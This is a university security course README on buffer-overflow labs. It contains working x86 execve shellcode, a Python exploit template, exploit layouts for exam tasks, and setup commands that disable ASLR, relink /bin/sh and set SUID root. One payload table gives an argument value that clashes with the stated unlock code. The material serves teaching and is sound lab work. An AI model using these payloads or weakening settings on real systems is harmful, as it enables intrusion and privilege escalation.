# 💥 CSE 406 — Cyber Security Sessional
## Online 1: Buffer Overflow Vulnerabilities & Exploitation

> **Course:** CSE 406 · Cyber Security Sessional · January 2026  
> **Student ID:** 2105032  
> **Section:** A2  

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Core Memory Exploitation Concepts](#-core-memory-exploitation-concepts)
  - [1. Stack Frame Architecture (x86 32-bit cdecl)](#1-stack-frame-architecture-x86-32-bit-cdecl)
  - [2. System Defenses & Environmental Settings](#2-system-defenses--environmental-settings)
  - [3. Return-to-Win (Ret2Win) Mechanics](#3-return-to-win-ret2win-mechanics)
  - [4. Shellcode Injection & NOP Sleds](#4-shellcode-injection--nop-sleds)
  - [5. Heap & BSS/Data Segment Corruptions](#5-heap--bssdata-segment-corruptions)
- [Learning & Tutorial Series](#-learning--tutorial-series)
  - [0. Online Class Demonstration (`0.online-class`)](#0-online-class-demonstration-0online-class)
  - [Ret2Win Progression (`1.Ret2Win` to `1.Ret2Win-x64`)](#ret2win-progression-1ret2win-to-1ret2win-x64)
  - [Data & Heap Overflows (`2.DataOverflow`, `3.HeapOverflow`)](#data--heap-overflows-2dataoverflow-3heapoverflow)
  - [Memory Layout & Compiler Investigation (`4.NOP-issues`)](#memory-layout--compiler-investigation-4nop-issues)
  - [Shellcode Injection Progression (`5.Inject2Win` to `v3`)](#shellcode-injection-progression-5inject2win-to-v3)
- [Exam Submissions & Live Solutions](#-exam-submissions--live-solutions)
  - [Section A2 — Function Chaining (`A2_Buffer_Overflow`) [Student 2105032]](#section-a2--function-chaining-a2_buffer_overflow-student-2105032)
  - [Section C1 — Stack Shellcode Injection (`C1_Buffer_Overflow`)](#section-c1--stack-shellcode-injection-c1_buffer_overflow)
  - [Section C2 — Heap Function-Pointer Overwrite (`C2_Buffer_Overflow`)](#section-c2--heap-function-pointer-overwrite-c2_buffer_overflow)
- [Past Exam Archive (`practice-Sample-Onlines`)](#-past-exam-archive-practice-sample-onlines)
- [Practical Exploitation Guide & Cheat Sheet](#-practical-exploitation-guide--cheat-sheet)
  - [Environment Setup & GCC Flags](#environment-setup--gcc-flags)
  - [GDB Debugging & Offset Calculation](#gdb-debugging--offset-calculation)
  - [Python Exploit Payload Template](#python-exploit-payload-template)
- [File Layout](#-file-layout)

---

## 🌐 Overview

Buffer overflow occurs when a program writes more data to a buffer than it was allocated to hold. In C/C++, lack of automatic bounds checking in standard library routines (such as `strcpy`, `strcat`, `gets`, `sprintf`, `fread`) enables attackers to corrupt adjacent memory spaces. 

This directory contains a complete curriculum and laboratory archive for **Buffer Overflow Vulnerabilities**:
1. **Foundational exercises**: From basic return address redirection to function chaining with parameters, clean stack returns, and 64-bit calling conventions.
2. **Beyond the stack**: Corrupting global/BSS variables and dynamic memory chunks on the heap.
3. **Shellcode execution**: Injecting machine code onto the stack and overcoming alignment / NOP-sled challenges.
4. **Live exam solutions**: Comprehensive analysis and verified exploits for timed university exams (**Section A2**, **Section C1**, **Section C2**).
5. **Historical exam archive**: Past onlines and solutions from previous batches (Batch-16 and Batch-18).

---

## 🧠 Core Memory Exploitation Concepts

### 1. Stack Frame Architecture (x86 32-bit cdecl)

In standard 32-bit x86 architecture (`cdecl` calling convention), function stack frames grow downward (from high memory addresses toward low memory addresses):

```
High Memory
┌──────────────────────────────────────────────┐
│ Function Arguments (arg2, arg1, ...)         │
├──────────────────────────────────────────────┤
│ Saved Return Address (EIP of caller)         │  <-- Target of overwrite (EBP + 4)
├──────────────────────────────────────────────┤
│ Saved Frame Pointer (Previous EBP)           │  <-- Target of overwrite (EBP)
├──────────────────────────────────────────────┤
│ Local Variables / Buffer[BUF_SZ]             │  <-- Vulnerable buffer (&buffer)
│ (Grows upward toward Saved EBP / EIP)        │
└──────────────────────────────────────────────┘
Low Memory
```

When an unbounded write occurs into `buffer`:
1. The buffer itself fills up.
2. Extra bytes overwrite compiler padding and the **Saved EBP** (4 bytes).
3. The next 4 bytes overwrite the **Saved Return Address (EIP)**.
4. Subsequent bytes overwrite the caller's stack frame or parameter slots.
5. When the vulnerable function executes `ret`, the CPU pops the value at ESP into EIP and jumps to whatever address the attacker supplied.

### 2. System Defenses & Environmental Settings

Modern operating systems deploy multiple defensive mitigations against memory corruption:

| Mitigation | Mechanism | Lab Configuration / Bypass |
|---|---|---|
| **ASLR** (Address Space Layout Randomization) | Randomizes base addresses of stack, heap, and libraries on each process launch. | Disabled during lab practice via `sudo sysctl -w kernel.randomize_va_space=0`. |
| **Stack Canaries** (`-fstack-protector`) | Places an integrity canary value right before the saved EBP; aborts if canary is corrupted. | Disabled for educational targets using GCC flag `-fno-stack-protector`. |
| **NX / DEP** (`execstack`) | Marks stack/heap pages non-executable to prevent machine code execution. | Bypassed via **Ret2Win** / **ROP**, or disabled for shellcode testing with `-z execstack`. |
| **Privilege Dropping** | Ubuntu's `/bin/sh` (dash) drops SUID privileges if `euid != uid`. | Relinked `/bin/sh` to `/bin/zsh` via `sudo ln -sf /bin/zsh /bin/sh` to preserve root shells. |

### 3. Return-to-Win (Ret2Win) Mechanics

When the stack is non-executable (NX enabled), injected machine code cannot run. Instead, control flow is diverted to existing functions in the target binary:

* **Simple Redirection**: Overwrite Saved Return Address with `&win`.
* **Argument Passing (32-bit `cdecl`)**: In 32-bit x86, arguments are passed on the stack. When jumping directly to a function `win(key1, key2)`:
  ```
  [Payload Padding] -> [ &win ] -> [ Dummy Return Addr ] -> [ Arg 1 (key1) ] -> [ Arg 2 (key2) ]
  ```
  `win` expects its return address at `ESP`, followed by its first argument at `ESP+4`, second at `ESP+8`.
* **Function Chaining**: Setting the dummy return address of function 1 to the entry address of function 2 allows seamless sequential execution:
  ```
  [ &func1 ] -> [ &func2 ] -> [ Arg1 for func1 ] -> ...
  ```

### 4. Shellcode Injection & NOP Sleds

When the stack is executable (`-z execstack`):
1. **Shellcode**: A compact sequence of raw x86 machine instructions that invokes the `execve` system call (`sys_execve = 11` on Linux x86) with arguments `["/bin/sh", NULL, NULL]`.
2. **NOP Sled (`0x90` bytes)**: Due to environment variable fluctuations or stack shifts, predicting the exact starting byte of shellcode can be imprecise. Placing a large runway of `NOP` (No Operation, opcode `0x90`) instructions before the shellcode allows the jumped address to land anywhere within the sled and safely slide down into the shellcode payload.

### 5. Heap & BSS/Data Segment Corruptions

* **BSS / Data Overflow**: Global or static uninitialized (`.bss`) and initialized (`.data`) variables are allocated adjacently in data segments. An overflow in a global `username[100]` can directly overwrite an adjacent global `password[100]`.
* **Heap Overflow**: Dynamically allocated structures via `malloc()` are situated in heap chunks. Writing past the size of chunk $A$ corrupts neighboring chunk $B$'s metadata or variables (e.g., function pointers, state booleans, or struct pointers).

---

## 📚 Learning & Tutorial Series

The tutorial challenges provide a structured learning path covering every standard exploitation scenario:

### 0. Online Class Demonstration (`0.online-class`)
- Base introductory files used during lecture instruction.
- Files: `prog.c`, `stack.c`, `badfile`, `ex.py`, `exploit.py`.
- Includes reference slides and setup notes: `S04_Buffer_Overflow.pptx.pdf`, `chapter4_bufferoverflow_sample.pdf`, `gdb_cheatsheet.txt`, `seed-vm-setup.txt`.

### Ret2Win Progression (`1.Ret2Win` to `1.Ret2Win-x64`)
- **[`1.Ret2Win`](1.Ret2Win)**: Basic stack overflow redirecting return address directly to `win()`. Non-executable stack.
- **[`1.Ret2Win-gets`](1.Ret2Win-gets)**: Exploiting `gets(name)`, which lacks any length bound and reads stdin until a newline.
- **[`1.Ret2Win-v2`](1.Ret2Win-v2)**: Function requires two matching integer keys: `win(int key1, int key2)` where `key1 == 0xdeadbeef` and `key2 == 0xcafebabe`. Demonstrates passing parameters via the stack layout `[win_addr] + [dummy_ret] + [0xdeadbeef] + [0xcafebabe]`.
- **[`1.Ret2Win-v3`](1.Ret2Win-v3)**: Requires setting global flag `is_admin = 1` inside `win()` and returning cleanly to `main()` without segfaulting.
- **[`1.Ret2Win-v4`](1.Ret2Win-v4)**: Combines argument passing (`key1 == 0xbabadada`, `key2 == 0xabbadada`), setting `is_admin = 1`, and returning cleanly without crashing.
- **[`1.Ret2Win-x64`](1.Ret2Win-x64)**: 64-bit x86-64 target. Demonstrates 8-byte pointer offsets, stack alignment (16-byte boundary requirement for SSE/glibc), and the `System V AMD64 ABI` differences (arguments passed in `RDI, RSI, RDX, RCX, R8, R9` rather than on the stack).

### Data & Heap Overflows (`2.DataOverflow`, `3.HeapOverflow`)
- **[`2.DataOverflow`](2.DataOverflow)**: Demonstrates BSS / data segment corruption. Global variables `char username[100]` and `char password[100]` are adjacent. Reading 400 bytes into `username` corrupts `password` to match `"admin"`.
- **[`3.HeapOverflow`](3.HeapOverflow)**: Demonstrates dynamic memory corruption. Two 10-byte buffers are allocated on the heap via `malloc(10)`. An overflow in `username` crosses heap chunk borders and overwrites `password`.

### Memory Layout & Compiler Investigation (`4.NOP-issues`)
- **[`4.NOP-issues`](4.NOP-issues)**: Contains `AddressTest.c`. Demonstrates how compiler flags, optimization levels, environment variables, and stack configurations shift runtime addresses of Stack, Heap, Code, Data, and BSS segments.

### Shellcode Injection Progression (`5.Inject2Win` to `v3`)
- **[`5.Inject2Win`](5.Inject2Win)**: Classic shellcode injection into the stack buffer. Requires `-z execstack`. Solved under constrained conditions without large NOP sleds.
- **[`5.Inject2Win-v2`](5.Inject2Win-v2)** & **[`5.Inject2Win-v3`](5.Inject2Win-v3)**: Handling restricted NOP sleds, address alignment variations, and reliable shellcode execution.

---

## 🏆 Exam Submissions & Live Solutions

### Section A2 — Function Chaining (`A2_Buffer_Overflow`) [Student 2105032]

#### 1. Target Vulnerability Analysis ([`target.c`](A2_Buffer_Overflow/target.c))
* **Student ID:** `032` (Last 3 digits: `32`).
* **Dynamic Sizing**:
  $$\text{BUF\_SZ} = 60 + \text{STUDENT\_ID} = 60 + 32 = 92 \text{ bytes}$$
  $$\text{READ\_SZ} = \text{BUF\_SZ} + 200 = 92 + 200 = 292 \text{ bytes}$$
  $$\text{UNLOCK\_CODE} = \text{0xA5A5A000} + 32 = \text{0xA5A5A020}$$
* **Vulnerable Routine**:
  ```c
  void vuln(char *str) {
      char buffer[BUF_SZ];
      strcpy(buffer, str); // Unchecked copy of up to 292 bytes into a 92-byte buffer
  }
  ```
* **Objective**:
  1. Overwrite `vuln`'s return address to invoke `unlock(int code)`.
  2. Pass `code == UNLOCK_CODE` (`0xA5A5A020`).
  3. Ensure `unlock` returns into `get_reward()`, which executes `system("/bin/sh")` to drop an interactive root shell.

#### 2. Exploit Payload Construction ([`exploit.py`](A2_Buffer_Overflow/exploit.py))
* **Calculated Offset (`ebp + 4 - buffer`)**: `98` bytes.
* **Stack Chaining Layout**:
  ```
  Offset 0..97    : 0x90 (NOP / Padding)
  Offset 98..101  : 0x5655628d  --> Address of unlock()
  Offset 102..105 : 0x565562fb  --> Address of get_reward() (unlock's return address)
  Offset 106..109 : 0xA5A5A01A  --> First argument to unlock() (UNLOCK_CODE matched)
  Offset 110..291 : 0x90 (Remaining buffer padding)
  ```
* **Execution & Verification**:
  Successfully unlocked the vault and dropped root shell:
  ```
  Checking code: 0xa5a5a020
  Code accepted! Vault unlocked!
  Treasure claimed! You win!
  # whoami
  root
  ```
  Verified artifact: [`terminal-output.png`](A2_Buffer_Overflow/terminal-output.png).

---

### Section C1 — Stack Shellcode Injection (`C1_Buffer_Overflow`)

#### 1. Target Vulnerability Analysis ([`target.c`](C1_Buffer_Overflow/target.c))
* **Buffer Configuration**:
  $$\text{BUF\_SZ} = 100 + \text{STUDENT\_ID} = 100 + 32 = 132 \text{ bytes}$$
  $$\text{READ\_SZ} = \text{BUF\_SZ} + 300 = 132 + 300 = 432 \text{ bytes}$$
* **Vulnerability**: `strcpy(buffer, str)` inside `process(char *str)`. No win function exists in the binary; the exploit requires injecting and executing shellcode.

#### 2. Exploit Payload Construction ([`exploit.py`](C1_Buffer_Overflow/exploit.py))
* **Shellcode**: Standard 24-byte Linux x86 `execve("/bin/sh", ...)`:
  ```python
  shellcode = (
      b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
      b"\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
  )
  ```
* **Payload Geometry**:
  * Return address offset: `144` bytes (`ebp + 4 - &buffer`).
  * Injected address: Target stack address pointing inside the NOP sled (`0xffffcce0 + 0x100`).
  * Shellcode placed at the end of the 432-byte payload.
* **Verification**: Landed cleanly in the NOP sled and spawned shell — verified in [`C1-successful-run.png`](C1_Buffer_Overflow/C1-successful-run.png).

---

### Section C2 — Heap Function-Pointer Overwrite (`C2_Buffer_Overflow`)

#### 1. Target Vulnerability Analysis ([`target.c`](C2_Buffer_Overflow/target.c))
* **Heap Layout**:
  Two dynamic structs allocated sequentially via `malloc()`:
  1. `UserData *user`: contains `char name[DATA_SZ]`, where `DATA_SZ = 24 + (STUDENT_ID % 16) = 24`.
  2. `Handler *handler`: contains a function pointer `void (*action)()`.
* **Vulnerability**: `fread(user->name, sizeof(char), READ_SZ, badfile)` reads up to `DATA_SZ + 100 = 124` bytes into `user->name`, overflowing into `handler`.
* **Goal**: Overwrite `handler->action` (normally pointing to `safe_action`) with the address of `secret_action()` (`0x565561f8`), which executes `system("/bin/sh")`.

#### 2. Exploit Payload Construction ([`exploit.py`](C2_Buffer_Overflow/exploit.py))
* **Calculated Distance**: `48` bytes from start of `user->name` to `handler->action`.
* **Payload**:
  ```python
  content = bytearray(0x90 for i in range(52))
  secret_action_addr = 0x565561f8
  content[48:52] = secret_action_addr.to_bytes(4, byteorder='little')
  ```
* **Verification**: Calling `handler->action()` executed `secret_action` and spawned root shell — verified in [`C2-Successful-run.png`](C2_Buffer_Overflow/C2-Successful-run.png).

---

## 🗄 Past Exam Archive (`practice-Sample-Onlines`)

Comprehensive repository of past term exams and solutions:
* **`Batch-16/`**:
  * `Online 1 A1`: Problem spec, source, and exploit scripts.
  * `Online 1 A2`: Problem spec, source, and exploit scripts.
  * `Online 1 B1`: Source `B1.c`, GDB notes, and solution.
  * `Online 1 B2`: Source `B2.c`, assignment PDF, and shell scripts.
  * `Solutions/`: Consolidated working Python exploit solutions for all Batch-16 sections.
* **`Batch-18/`**:
  * `online-A1`: Spec PDF `CSE406_Online1_A1.pdf`, vulnerable code `A1.c`, exploit `ex.py`.
  * `Online1-B1`: Spec PDF `CSE406_Online1_B1.pdf`, vulnerable code `B1.c`, exploit `ex.py`.

---

## 🛠 Practical Exploitation Guide & Cheat Sheet

### Environment Setup & GCC Flags

To compile vulnerable programs for educational practice:

```bash
# 1. Disable Address Space Layout Randomization (ASLR)
sudo sysctl -w kernel.randomize_va_space=0

# 2. Prevent /bin/sh from dropping privileges
sudo ln -sf /bin/zsh /bin/sh

# 3. Compile vulnerable 32-bit binary with executable stack and no stack protector
gcc -m32 -o target -z execstack -fno-stack-protector target.c

# 4. (Optional) Set SUID root permissions to test privilege escalation
sudo chown root target
sudo chmod 4755 target

# 5. Compile with debugging symbols for GDB inspection
gcc -m32 -g -o target_dbg -z execstack -fno-stack-protector target.c
```

### GDB Debugging & Offset Calculation

Essential commands inside GDB to determine offsets and addresses:

```gdb
# Start GDB with the target binary
gdb -q ./target_dbg

# Set breakpoint at vulnerable function entry
(gdb) b vuln
(gdb) run

# Print exact byte distance from buffer to Saved Return Address
(gdb) p/d (void *)$ebp + 4 - (void *)&buffer

# Print address of buffer, EBP, and return address slot
(gdb) p &buffer
(gdb) p $ebp
(gdb) p (void *)$ebp + 4

# Print address of a target win function
(gdb) p win
(gdb) p unlock
(gdb) p get_reward
(gdb) p secret_action

# Examine memory contents (hex words) at ESP
(gdb) x/16wx $esp
```

### Python Exploit Payload Template

A robust template for generating binary payload files (`badfile`):

```python
#!/usr/bin/env python3
import sys

# 1. Configuration & Sizes
PAYLOAD_SIZE = 300
OFFSET = 98  # ebp + 4 - &buffer found via GDB

# 2. Linux x86 24-byte execve("/bin/sh") Shellcode
shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x99"                 # cdq
    b"\xb0\x0b"             # mov al, 11 (sys_execve)
    b"\xcd\x80"             # int 0x80
)

# 3. Allocate NOP sled buffer
content = bytearray(0x90 for _ in range(PAYLOAD_SIZE))

# --- Option A: Ret2Win with Function Chaining ---
target_fn1 = 0x5655628d  # unlock()
target_fn2 = 0x565562fb  # get_reward()
arg1 = 0xa5a5a020        # UNLOCK_CODE

content[OFFSET:OFFSET+4]     = target_fn1.to_bytes(4, byteorder='little')
content[OFFSET+4:OFFSET+8]   = target_fn2.to_bytes(4, byteorder='little')
content[OFFSET+8:OFFSET+12]  = arg1.to_bytes(4, byteorder='little')

# --- Option B: Shellcode Injection ---
# target_addr = 0xffffd3c4 + 0x50  # Landing point inside NOP sled
# content[OFFSET:OFFSET+4] = target_addr.to_bytes(4, byteorder='little')
# content[-len(shellcode):] = shellcode

# 4. Write payload to badfile
with open("badfile", "wb") as f:
    f.write(content)
print(f"[+] Successfully wrote {len(content)} bytes to badfile")
```

---

## 📁 File Layout

```
Online-1-Buffer-Overflow/
├── readme.md                           # Comprehensive documentation (this file)
├── 0.online-class/                     # Lecture demos, slide decks, and GDB cheat sheets
├── 1.Ret2Win/                          # Basic Ret2Win return-address overwrite
├── 1.Ret2Win-gets/                     # Ret2Win against unbounded gets()
├── 1.Ret2Win-v2/                       # Ret2Win with stack parameters
├── 1.Ret2Win-v3/                       # Ret2Win with clean exit (no segfault)
├── 1.Ret2Win-v4/                       # Ret2Win with parameters + clean exit
├── 1.Ret2Win-x64/                      # 64-bit calling convention & alignment Ret2Win
├── 2.DataOverflow/                     # Global / BSS variable overflow
├── 3.HeapOverflow/                     # Dynamic malloc() heap chunk corruption
├── 4.NOP-issues/                       # Memory layout & segment address investigation
├── 5.Inject2Win/                       # Stack shellcode injection (no NOPs)
├── 5.Inject2Win-v2/                    # Stack shellcode injection with NOP sleds
├── 5.Inject2Win-v3/                    # Shellcode injection with alignment fixes
├── A2_Buffer_Overflow/                 # Section A2 Live Exam (Student 2105032 - Function Chaining)
│   ├── target.c                        # Vulnerable source with dynamic BUF_SZ
│   ├── exploit.py                      # Solved exploit script (unlock -> get_reward)
│   ├── terminal-output.png             # Execution proof & root shell screenshot
│   └── A2_Buffer_Overflow.pdf          # Official exam task statement
├── C1_Buffer_Overflow/                 # Section C1 Live Exam (Shellcode injection)
│   ├── target.c                        # Vulnerable source
│   ├── exploit.py                      # Solved exploit with NOP sled
│   ├── C1-successful-run.png           # Execution proof
│   └── C1.pdf                          # Official exam task statement
├── C2_Buffer_Overflow/                 # Section C2 Live Exam (Heap function pointer overwrite)
│   ├── target.c                        # Vulnerable source (UserData & Handler structs)
│   ├── exploit.py                      # Solved heap exploit
│   ├── C2-Successful-run.png           # Execution proof
│   └── C2_Buffer_Overflow.pdf          # Official exam task statement
├── practice-Sample-Onlines/            # Past exam archives
│   ├── Batch-16/                       # Batch 16 Onlines A1, A2, B1, B2 + solutions
│   └── Batch-18/                       # Batch 18 Onlines A1, B1 + specs
└── templates/                          # Reusable exploit templates and command references
    ├── exploit_temp.py                 # Boilerplate python exploit script
    └── important_cmds.txt              # Essential Linux and GCC commands
```

---

<div align="center">

*CSE 406 · Cyber Security Sessional · BUET · January 2026*

</div>

